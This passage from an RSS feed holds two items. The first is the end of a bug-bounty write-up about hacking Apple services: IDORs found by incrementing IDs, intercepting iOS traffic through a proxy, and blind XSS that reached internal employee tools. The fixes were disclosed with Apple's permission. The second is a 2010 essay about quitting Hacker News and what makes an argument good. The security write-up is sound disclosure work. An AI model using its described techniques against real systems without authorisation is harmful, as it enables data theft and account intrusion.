&lt;ul&gt;&lt;li&gt;Retrieve any Apple users email address via an incremental numeric identifier permanently tied to their account&lt;/li&gt;
&lt;li&gt;Associate the attacker's Apple account with the victim's so that the attacker can send them notifications, show their own location within the victim's phone, and not be deleted from their Find my Friends page&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;
&lt;h4&gt;Support Case IDOR&lt;/h4&gt;
&lt;p&gt;One of the more challenging parts of figuring out what to hack on was intercepting the iOS HTTP traffic. There were a lot of really interesting apps and APIs on the actual device, but many of the domains belonging to Apple were SSL pinned and none of us had a strong enough mobile background nor the significant amount of time required to pick apart the actual iOS device.&lt;/p&gt;
&lt;p&gt;People have achieved this in the past and been able to intercept all of the HTTP traffic, but luckily for us, a huge portion of the traffic was still interceptable within various apps if you set up your proxy in a certain way.&lt;/p&gt;
&lt;p&gt;The way in which we did this was setting up the Burp proxy, installing the certificate, then connecting to the WiFi which had the Burp Proxy enabled whenever we got to a page that we wanted to try to intercept. An example of this would be the failure to load the core App Store while proxying all HTTP requests, but ability to load the app store while not proxying, navigating to the correct sub-page you want to intercept, then enabling the proxy at that point.&lt;/p&gt;
&lt;p&gt;This allowed us to capture many API calls for the Apple owned apps that were installed by default on the iPhone. One of these was a support app for scheduling support or speaking with a live chat agent.&lt;/p&gt;
&lt;p&gt;From intercepting these, there were a few very obvious IDORs from multiple endpoints that would reveal metadata about support case details. You were able to retrieve information about the victim’s support case details (what support they had requested, their device serial number, their user ID) and additionally a token that appeared to be used when requesting live chat with support agents.&lt;/p&gt;
&lt;p&gt;Overall, an attacker could've abused this to...&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Leak support case metadata like device serial number and support information for all apple support cases&lt;/li&gt;
&lt;/ul&gt;&lt;h4&gt;IDOR on mfi.apple.com&lt;/h4&gt;
&lt;p&gt;Another application that we spent a lot of time on was “mfi.apple.com”. This service was designed for employees of companies that produced third party electronic accessories that interfaced with the iPhone to retrieve documentation and support for their manufacturing process.&lt;/p&gt;
&lt;p&gt;After filling out the application, we observed an HTTP request being sent to “getReview.action” with a numeric ID parameter. We went ahead and incremented the parameter via minus one and observed we could access another company's application.&lt;/p&gt;
&lt;p&gt;The application returned nearly every value provided for the company application including names, emails, addresses, and invitation keys which could be used to join the company. A simple estimate based on our most recent ID and the base ID indicated around 50,000 different retrievable applications through this vulnerability.&lt;/p&gt;
&lt;p&gt;Overall, an attacker could've abused this to...&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Leak the entire account information for anyone who has applied to use Apple's MFi portal&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;
&lt;div id=&quot;vuln12&quot; class=&quot;section&quot;&gt;
&lt;h2&gt;Various Blind XSS Vulnerabilities&lt;/h2&gt;
&lt;p&gt;With nearly every application encountered we made sure to spray as many blind XSS payloads as possible. This lead to some very interesting vulnerabilities affecting applications like...&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Employee session access within an internal app for managing Apple Maps address information&lt;/li&gt;
&lt;li&gt;Employee session access within an internal app for managing Apple Books publisher information&lt;/li&gt;
&lt;li&gt;Employee session access within an internal app for managing Apple Store and customer support tickets&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;These findings were very typical blind XSS as we'd found them by submitting payloads within an address field, Apple Books book submission title, and lastly our first and last name.&lt;/p&gt;
&lt;p&gt;The internal applications were very interesting and all appeared to have a comfortable level of access since they fired within the context of Apple employee management tools. We were able to act on the behalf of someone who was expected to be logged in from either a VPN or an on-site location to manage user and system information.&lt;/p&gt;
&lt;p&gt;The following screenshots show the redacted panels that we were able to exfiltrate via HTML5 DOM screenshots through XSS hunter:&lt;/p&gt;
&lt;img loading=&quot;lazy&quot; width=&quot;1024&quot; height=&quot;614&quot; class=&quot;wp-image-1326&quot; src=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/09/3-1024x614.png&quot; alt=&quot;&quot; srcset=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/09/3-1024x614.png 1024w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/09/3-300x180.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/09/3-768x460.png 768w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/09/3.png 1462w&quot; sizes=&quot;(max-width: 1024px) 100vw, 1024px&quot;/&gt;&lt;img loading=&quot;lazy&quot; width=&quot;1024&quot; height=&quot;671&quot; class=&quot;wp-image-1327&quot; src=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/09/2-1024x671.png&quot; alt=&quot;&quot; srcset=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/09/2-1024x671.png 1024w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/09/2-300x197.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/09/2-768x504.png 768w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/09/2.png 1339w&quot; sizes=&quot;(max-width: 1024px) 100vw, 1024px&quot;/&gt;&lt;img loading=&quot;lazy&quot; width=&quot;1024&quot; height=&quot;517&quot; class=&quot;wp-image-1328&quot; src=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/09/bookinfo-1024x517.png&quot; alt=&quot;&quot; srcset=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/09/bookinfo-1024x517.png 1024w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/09/bookinfo-300x151.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/09/bookinfo-768x388.png 768w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/09/bookinfo-1536x775.png 1536w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/09/bookinfo-1600x808.png 1600w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/09/bookinfo.png 1702w&quot; sizes=&quot;(max-width: 1024px) 100vw, 1024px&quot;/&gt;&lt;img loading=&quot;lazy&quot; width=&quot;1024&quot; height=&quot;667&quot; class=&quot;wp-image-1329&quot; src=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/09/1-1024x667.png&quot; alt=&quot;&quot; srcset=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/09/1-1024x667.png 1024w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/09/1-300x196.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/09/1-768x501.png 768w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/09/1.png 1341w&quot; sizes=&quot;(max-width: 1024px) 100vw, 1024px&quot;/&gt;&lt;p&gt;Since the applications were internal and we weren't actual attackers we stopped here at each finding. These applications would've allowed an attacker to at the very least exfiltrate a large amount of sensitive information regarding internal Apple logistics and employees/users.&lt;/p&gt;
&lt;/div&gt;
&lt;h2&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;When we first started this project we had no idea we'd spend a little bit over three months working towards it's completion. This was originally meant to be a side project that we'd work on every once in a while, but with all of the extra free time with the pandemic we each ended up putting a few hundred hours into it.&lt;/p&gt;
&lt;p&gt;Overall, Apple was very responsive to our reports. The turn around for our more critical reports was only four hours between time of submission and time of remediation.&lt;/p&gt;
&lt;p&gt;Since no-one really knew much about their bug bounty program, we were pretty much going into unchartered territory with such a large time investment. Apple has had an interesting history working with security researchers, but it appears that their vulnerability disclosure program is a massive step in the right direction to working with hackers in securing assets and allowing those interested to find and report vulnerabilities.&lt;/p&gt;
&lt;p&gt;Writing this blog post has been an interesting process as we were a bit unsure how to actually go about doing it. To be honest, each bug we found could've probably been turned into a full writeup with how much random information there was. The authentication system Apple uses was fairly complex and to reference it with 1-2 sentences felt as if we were cheating someone out of information. The same thing could be said about many elements within Apple's infrastructure like iCloud, the Apple store, and the Developer platform.&lt;/p&gt;
&lt;p&gt;As of now, October 4th, we have received four payments totaling $51,500 for the following vulnerability reports:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;$5,000 - Disclosing the Full Name of iCloud users via Editor Invitation on redacted&lt;/li&gt;
&lt;li&gt;$6,500 - Gopher/CRLF Semi-Blind SSRF with Access to Internal Corporate Environments&lt;/li&gt;
&lt;li&gt;$6,000 - IDOR on https://redacted/&lt;/li&gt;
&lt;li&gt;$34,000 - Multiple eSign environments vulnerable to system memory leaks containing secrets and customer data due to public-facing actuator heapdump, env, and trace&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;However, it appears that Apple does payments in batches and will likely pay for more of the issues in the following months.&lt;/p&gt;
&lt;p&gt;We've obtained permission from the Apple security team (product-security@apple.com) to publish this and are doing so under their discretion. All of the vulnerabilities disclosed here have been fixed and re-tested. Please do not disclose information pertaining to Apple's security without their permission.&lt;/p&gt;
&lt;h2&gt;Supporting Resources&lt;/h2&gt;
&lt;h2&gt;Addendum&lt;/h2&gt;
&lt;p&gt;Huge thanks to the following people:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Jack Cable&lt;/li&gt;
&lt;li&gt;Dan Ritter&lt;/li&gt;
&lt;li&gt;Nathanial Lattimer&lt;/li&gt;
&lt;li&gt;Jasraj Bedi&lt;/li&gt;
&lt;li&gt;Justin Rhinehart&lt;/li&gt;
&lt;li&gt;Everyone on the Apple product security team who have been incredibly responsive and involved with our submissions&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;If you made it this far, thanks for reading! Feel free to reach out with any questions or comments at admin(at)samcurry.net or using the contact form.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
</description>
<pubDate>Thu, 08 Oct 2020 11:25:57 +0000</pubDate>
<dc:creator>samwcyo</dc:creator>
<og:type>article</og:type>
<og:title>We Hacked Apple for 3 Months: Here’s What We Found</og:title>
<og:description>Between the period of July 6th to September 6th myself, Brett Buerhaus, Ben Sadeghipour, Samuel Erb, and Tanner Barnes worked together and hacked on the Apple bug bounty program.</og:description>
<og:url>https://samcurry.net/hacking-apple/</og:url>
<og:image>https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/unknown.png?time=1602203878</og:image>
<dc:language>en-US</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://samcurry.net/hacking-apple/</dc:identifier>
</item>
<item>
<title>Why I stopped reading HN (2010)</title>
<link>https://sealedabstract.com/rants/why-i-stopped-reading-hn/</link>
<guid isPermaLink="true" >https://sealedabstract.com/rants/why-i-stopped-reading-hn/</guid>
<description>&lt;p&gt;This post has been a long time in coming.  I stopped reading HN over a month ago, so I’ve had some time to cool off.  I’ve been struggling to put my thoughts into words, and so this post has sat in the drafts folder until today I realized that it’s as well-thought-out as it’s ever going to be.  If you don’t want to be sucked in to a whirlwind flamewar about philosophy of learning and effective use of time, just stop reading now.  Find some feel-good post about Venture Capital and go read that instead. &lt;strong&gt;Abandon all hope, ye who enter here.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Every community deteriorates over time.  Every community gets new members who don’t understand the rules (or the rules just change), and things just deteriorate.&lt;/p&gt;
&lt;p&gt;I’m not saying that HN is somehow bad or awful or has turned into Reddit.  HN is in fact probably the shining example of how to keep a community pristine.  But it’s crossed &lt;em&gt;my personal threshold&lt;/em&gt;.  I am very, very careful with my time, and as of late it’s become incredibly clear that HN has deteriorated to the point that I can no longer consider it time well spent.&lt;/p&gt;
&lt;p&gt;Now before you lash out at me, ponder for a moment how hard it really is to let go of HN.  In some sense I think it’s like cutting off a limb.  HN was my go-to source for tech news.  It’s how I kept in touch with other programmers.  It’s how I got feedback on my business ideas and code (in fact, people still do submit my projects there… and it’s really really hard not to click on a link that’s responsible for thousands of visitors in your referrer logs.  OK, guilty).  And I have to do a lot of work to replicate those things without HN (e.g. actually go out and have coffee with programmers, actually use an RSS reader to get my tech news, actually talk to (gasp) customers about business ideas… the code review part I’m still working on)  But the thing I miss the most–the thing that’s hardest to replace for me–the thing that’s really most important, is the arguments.&lt;/p&gt;
&lt;p&gt;I consider it extremely important–perhaps vital, even–to spend time engaging others intelligently who have diverging views from one’s own.  I think that this is, on the whole, one of the most valuable uses of one’s time that exists.  Whether it’s consulting a disagreeable book or a person, somehow at the intersection of intelligence and difference lies a “something” that is mind-expanding.  There are exceptions, of course, most of which chip away at either the intelligence or some quality of the debate itself.  But by and large, I find that the discussion itself–not the convincing, or the settlement, or the “agree to disagree”, but something innate in trying to understand another’s views enough to refute them that is the most powerful teacher.  With the right discussion, you can walk away with the same general idea as you started with or a totally different one, but by the experience you cannot help but be transformed and it’s only through a little friendly sparring that you truly find out what you know.&lt;/p&gt;
&lt;p&gt;I’ve never felt the need to write this out in words–which is probably why the paragraph above is awkward.  It’s something that is innate to me; perhaps it’s even axiomatic.  I don’t even know where I would begin to convince you that it is true, but I can only say that I know it is true from my own experience–having arguments is how I’ve learned just about everything I know.&lt;/p&gt;
&lt;p&gt;Since I am doing so poorly at this, here’s a quote from a book that has I think the essence of the same idea:&lt;/p&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;But the Second Friend is the man who disagrees with you about everything. He is not so much the &lt;em&gt;alter ego&lt;/em&gt; as the antiself. Of course he shares your interests; otherwise he would not become your friend at all. But he has approached them all at a different angle. He has read all the right books but has got the wrong thing out of every one. It is as if he spoke your language but mispronounced it.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Now of course there are &lt;em&gt;bad&lt;/em&gt; arguments.&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Arguments that reduce to a disagreement about semantics&lt;/li&gt;
&lt;li&gt;Arguments of mere contradiction&lt;/li&gt;
&lt;li&gt;Arguments that do not use something like the bisection method to find the &lt;em&gt;first&lt;/em&gt; point of disagreement and study that point in detail.  These arguments often &lt;em&gt;diverge&lt;/em&gt; rather than &lt;em&gt;converge&lt;/em&gt;, i.e. Godwin’s law.&lt;/li&gt;
&lt;li&gt;Arguments that stem from a disagreement about facts&lt;/li&gt;
&lt;li&gt;Arguments on an entirely different intellectual plane, be it higher or lower, than one on which I can comfortably operate&lt;/li&gt;
&lt;li&gt;Arguments that are a spectator sport, or otherwise take place in public in a way that prevents me from easily retracting my mistakes&lt;/li&gt;
&lt;li&gt;Arguments in which I am dealing with a person of substantially higher or lower social status or perceived intelligence, particularly because this sort of thing commonly leads to ad-hominem attacks and unfair burden of proof, even in the best of cases&lt;/li&gt;
&lt;li&gt;Unfair reasoning–that is, using of fallacies but also certain types of “unfair” lines of thought, i.e. “Your argument is stupid” (which is not exactly a non-sequiter)&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;This is by no means an exhaustive list.  It’s one I’ve compiled from experience.  When I am having an argument and I’m not learning anything, I can usually point to one or more of the things on the list as the reason why the argument has gone bad.  But we can only say that something has “gone bad” if we have an idea of what the good version is like.  And in spite of its rarity, a real argument is a very, very beneficial thing. It’s just hard to construct.&lt;/p&gt;
&lt;p&gt;Semantic arguments are particularly insidious.  Trained logicians should know that semantic meaning is arbitrary (unless the actual argument is about language).  The worst thing you can do is to have an argument in which you talk past each other because you each have a different idea about what the words mean.  Abortion is the canonical example of this type of argument: once you have decided what “life” is, there’s really not much else to discuss.  It’s not a political argument, not even in theory.  It’s purely a semantic one.&lt;/p&gt;
&lt;p&gt;But semantics come up in all sorts of arguments.  The respectable thing to do is to say “When I say &lt;em&gt;tastefulness&lt;/em&gt;, I really mean &lt;em&gt;this”&lt;/em&gt; and otherwise set up some technical terms so you can have a conversation that discusses &lt;em&gt;actual things&lt;/em&gt;.  If you don’t lay a groundwork for the meaning of the words in the thesis of the argument, nothing else follows, and the entire thing can become a waste of time.  Even if we can’t come to terms on the meaning of &lt;em&gt;tastefulness&lt;/em&gt;, perhaps we can substitute another word.  Or perhaps we must run in circles for a bit to find enough common ground to proceed.  But what we cannot do is say “Look here, now you’re being pedantic.”  When a semantic problem arises, the &lt;em&gt;only&lt;/em&gt; polite and respectable response is to point it out and attempt to address it, no matter how trivial it may appear.  The troll is the one who lets the argument proceed so you can continue to talk past each other; the logician is the one who is willing to take time and effort to resolve the troublesome point.&lt;/p&gt;
&lt;p&gt;Spectator sports are another common way for an argument to go bad.  When Congress has a debate, they are not really talking to each other.  They are posturing for the pundits and point-talkers who watch CNN.  This is why there can be no consensus in Congress and why so little gets done–there is no interest in solving problems, only in eloquent speech.  It’s not really an argument so much as a show.&lt;/p&gt;
&lt;p&gt;When I started reading HN, I had a lot of really good arguments in the comments.  Things that expanded my mind, and all that good stuff.  But slowly the arguments “turned bad”, because an increasing number started having elements on the “bad list”.  And the last few weeks of my time there, all of the arguments were bad.  So it’s just not useful to me anymore.&lt;/p&gt;
&lt;p&gt;For instance, I have had more semantic arguments the last month on HN than perhaps in any other month of my life.  Some of this is because HN is shifting away from a CS focus.  Now I don’t think this is &lt;em&gt;inherently&lt;/em&gt; bad.  But it’s certainly a lot harder to have a disagreement about “What is a pointer” or “what is an integer” than it is to have an argument about “what is badness” or “what is underemployment.”  There are pitfalls in the humanities and the social sciences that don’t exist in formal subjects like CS or math, so if we go into them with the exact same cautiousness and carefulness as we do with CS or math we will end up much worse.  It’s simply harder not to drift into a semantic disagreement in an informal language.&lt;/p&gt;
&lt;p&gt;It’s my perception that it’s also become much more of a spectator sport.  Perhaps I am alone in this, but I don’t remember very consciously thinking about appealing to lurkers when I wrote comments a year ago.  It’s gotten to the point now where I sometimes think about writing a comment to “send it out to gain karma” in the same way that I think about “sending off a unit to collect resources” in an RTS.  It’s deathly, horrible thinking that has come over me.  I can’t determine whether I am alone in this experience or if others have started thinking like me.  I also can’t figure out exactly what triggered it in my own mind.  But somehow, the perception of nameless faceless third parties that are the “true audience” of my writing has somehow changed the way I write.  It’s happened recently, and I hate it.&lt;/p&gt;
&lt;p&gt;Those are the two that stand out to me, because I keep seeing them crop up, but I’ve seen isolated cases of just about everything else.  There was a well-voted comment in my last few days that was a simple refutation (‘mere contradiction’) of the parent.  I’ve seen an increasing number of well-received instances of large quantities of logical fallacies.  And I’ve seen an increasing number of replies to a detailed and thoughtful comment that say “There are so many errors in there I’m not going to refute you”, which is itself a type of meta-fallacy or mere contradiction.  I’ve seen a few examples of someone taking the polite road of “Wait a minute, let’s solve this semantic problem before we go any further,” only to be rejoined with “that semantic problem is stupid, how can you think that,” a terrible (perhaps unforgivable) sin.    I’ve seen arguments that stem from a disagreement about facts.  Worst of all, I saw a very insightful (apparently unpopular) comment with a high-voted rejoinder that basically quoted from it, contradicted it, and occasionally inserted some “I can’t believe you would say this in polite company” sort of remarks that failed to address the argument on the merits, but did have the effect that the poor soul who authored it was shamed into deleting it. Followed by a meta-meta-discussion of whether deleting comments should &lt;em&gt;even be allowed&lt;/em&gt;. Better to let the someone stew in the shame of his logical argument, that’ll teach him.&lt;/p&gt;
&lt;p&gt;But the clincher for me was an exchange I had some time ago (although I didn’t realize it at the time).  It was, on my end, a mostly positive bout although we did narrowly recover from trouble in a few places.  But when we reached the end, I was told “This was basically a waste of time for me and I can’t believe this is how I spent my evening.”  My opponent was not alone, because a third party jumped in and said “as interesting and as well-formed as this discussion is, it was also a waste of time for me reading it.”&lt;/p&gt;
&lt;p&gt;I don’t mean to be that child who “takes his marbles and goes home”, &lt;strong&gt;but for me this is the end of the road&lt;/strong&gt;.  I can understand that “&lt;em&gt;bad&lt;/em&gt; arguments are bad”, as I’ve laid out in some detail, but this is something else entirely–the sort of discussion that is largely beneficial (or perhaps only ‘uncommonly beneficial’) in that it avoids more pitfalls than most–that rare gem that is capable of expanding my mind–yet it was still somehow judged insufficient.  Perhaps I can understand in a stiff academic way the sort of creature who would judge that sort of argument a poor use of time.  But I do not think that I can have a beneficial dialogue with that sort of person.  Because by definition, the thing that I value (perhaps) the most is of no worth to him.&lt;/p&gt;
&lt;p&gt;So I’ve moved HN to my hosts file, and I am returning to the old way of learning–that is, arguing with people in person or via &lt;a onclick=&quot;javascript:pageTracker._trackPageview('/mailto/drew@sealedabstract.com');&quot; href=&quot;mailto:drew@sealedabstract.com&quot;&gt;e-mail&lt;/a&gt;, reading disagreeable books, and the like.  It’s more intimate–more personal–perhaps more meaningful.  And if you’re the sort of person who shares enough common ground with me that you see the benefit of disagreements, drop me a line.  Some of my contacts for doing this have grown a little stale over the HN years.&lt;/p&gt;
&lt;p&gt;I’ve talked about this at some length with my friends over the last month (some popular HNers, some not), and some of them have said “but can’t you just read the articles and not read the comments?  Just because the discussions have gone to hell doesn’t mean you have to leave; just ignore them.”  To me, the value of HN was never as a news site (this is what RSS readers are for).  The articles on HN are merely something to talk &lt;em&gt;about&lt;/em&gt;.  It’s a pretext.  You don’t plan a dinner-and-a-movie to eat dinner and watch a movie; that’s just the pretext.  And I didn’t read HN because I thought it made a good news aggregator; I read it for the company.&lt;/p&gt;
&lt;hr /&gt;&lt;strong&gt;Want me to build your app&lt;/strong&gt; / consult for your company / speak at your event? Good news! I'm an &lt;a href=&quot;http://drewcrawfordapps.com&quot;&gt;iOS developer for hire&lt;/a&gt;.&lt;p&gt;&lt;strong&gt;Like this post?&lt;/strong&gt; Contribute to the coffee fund so I can write more like it. &lt;/p&gt;</description>
<pubDate>Thu, 08 Oct 2020 07:22:25 +0000</pubDate>
<dc:creator>obilgic</dc:creator>
<og:type>article</og:type>
<og:title>Why I stopped reading HN</og:title>
<og:url>/rants/why-i-stopped-reading-hn/</og:url>
<og:description>This post has been a long time in coming.  I stopped reading HN over a month ago, so I’ve had some time to cool off.  I’ve been struggling to put my thoughts into words, and so this pos…</og:description>
<og:image>https://s0.wp.com/i/blank.jpg</og:image>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://sealedabstract.com/rants/why-i-stopped-reading-hn/</dc:identifier>
</item>
</channel>
</rss>